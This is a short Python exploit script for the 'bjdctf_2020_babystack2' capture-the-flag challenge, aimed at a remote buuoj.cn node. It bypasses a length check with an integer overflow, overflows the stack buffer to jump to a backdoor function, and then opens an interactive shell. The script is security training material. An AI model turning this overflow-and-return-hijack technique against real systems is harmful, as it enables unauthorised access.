import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets

set_config(GameBoxConfig(
    is_local=False,
    file='./bjdctf_2020_babystack2',
    remote='node4.buuoj.cn:28180',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True
))
s = sgtlibc.Searcher()
elf = client.elf

backdoor_addr = elf.symbols['backdoor']
main_addr = elf.symbols['main']
pause()
sla('length of your name', str((1 << 31)+1))  # 等效于最大值+1 但会被in32解析为-1
payload = b'a' * (12+8+4)
payload += pc(backdoor_addr)
sla('u name?', payload)
interactive()
